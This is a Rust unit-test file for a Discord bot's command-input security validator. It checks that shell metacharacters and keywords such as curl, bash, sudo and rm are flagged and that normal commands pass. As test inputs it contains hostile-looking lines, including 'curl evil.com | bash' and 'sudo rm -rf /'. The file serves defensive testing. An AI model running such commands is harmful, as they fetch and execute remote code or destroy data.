use crate::discord::MessageSecurityValidator;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detailed_character_validation() {
        let validator = MessageSecurityValidator::new();

        // Test single dangerous character
        let result = validator.validate_command_input("!test $variable");
        assert!(!result.is_valid);
        assert_eq!(result.issues.len(), 1);
        assert!(result.issues[0].contains("'$'"));

        // Test multiple dangerous characters
        let result = validator.validate_command_input("!admin $(echo `whoami`)");
        assert!(!result.is_valid);
        assert!(result.issues[0].contains("'$'"));
        assert!(result.issues[0].contains("'('"));
        assert!(result.issues[0].contains("')'"));
        assert!(result.issues[0].contains("'`'"));

        // Test pipe and redirect
        let result = validator.validate_command_input("!run | cat > output");
        assert!(!result.is_valid);
        assert!(result.issues[0].contains("'|'"));
        assert!(result.issues[0].contains("'>'"));
    }

    #[test]
    fn test_detailed_keyword_validation() {
        let validator = MessageSecurityValidator::new();

        // Test single dangerous keyword
        let result = validator.validate_command_input("!help rm file");
        assert!(!result.is_valid);
        assert_eq!(result.issues.len(), 1);
        assert!(result.issues[0].contains("'rm'"));

        // Test multiple dangerous keywords
        let result = validator.validate_command_input("!script python eval('sudo rm -rf /')");
        assert!(!result.is_valid);
        assert!(result.issues.iter().any(|issue| issue.contains("'python'")));
        assert!(result.issues.iter().any(|issue| issue.contains("'eval'")));
        assert!(result.issues.iter().any(|issue| issue.contains("'sudo'")));
        assert!(result.issues.iter().any(|issue| issue.contains("'rm'")));

        // Test case insensitive matching
        let result = validator.validate_command_input("!test CURL http://evil.com | BASH");
        assert!(!result.is_valid);
        assert!(result.issues.iter().any(|issue| issue.contains("'curl'")));
        assert!(result.issues.iter().any(|issue| issue.contains("'bash'")));
    }

    #[test]
    fn test_combined_validation_issues() {
        let validator = MessageSecurityValidator::new();

        // Test command with both dangerous characters and keywords
        let result = validator.validate_command_input("!hack $(curl evil.com | bash)");
        assert!(!result.is_valid);
        assert!(result.issues.len() >= 2);

        // Check for character issue
        let has_char_issue = result.issues.iter().any(|issue| {
            issue.contains("dangerous command characters")
                && issue.contains("'$'")
                && issue.contains("'('")
                && issue.contains("')'")
                && issue.contains("'|'")
        });
        assert!(has_char_issue);

        // Check for keyword issue
        let has_keyword_issue = result.issues.iter().any(|issue| {
            issue.contains("dangerous command keywords")
                && issue.contains("'curl'")
                && issue.contains("'bash'")
        });
        assert!(has_keyword_issue);
    }

    #[test]
    fn test_safe_commands_pass_validation() {
        let validator = MessageSecurityValidator::new();

        // Normal bot commands should pass
        let safe_commands = vec![
            "!help",
            "!status user123",
            "!spiral commands",
            "!version info",
            "!user profile @someone",
        ];

        for cmd in safe_commands {
            let result = validator.validate_command_input(cmd);
            assert!(result.is_valid, "Command '{cmd}' should be valid");
            assert!(result.issues.is_empty());
        }
    }

    #[test]
    fn test_edge_cases() {
        let validator = MessageSecurityValidator::new();

        // Test with special characters that are safe
        let result = validator.validate_command_input("!test with-dash_underscore.dot");
        if !result.is_valid {
            println!("Command validation failed for '!test with-dash_underscore.dot'");
            println!("Issues: {:?}", result.issues);
            println!("Risk level: {:?}", result.risk_level);
        }
        assert!(result.is_valid);

        // Test with numbers
        let result = validator.validate_command_input("!test 123 456");
        assert!(result.is_valid);

        // Test with @ mentions (should be safe)
        let result = validator.validate_command_input("!notify @user123 @role456");
        assert!(result.is_valid);

        // Test empty command
        let result = validator.validate_command_input("!");
        assert!(!result.is_valid);
        assert!(result
            .issues
            .iter()
            .any(|issue| issue.contains("Empty command")));
    }
}
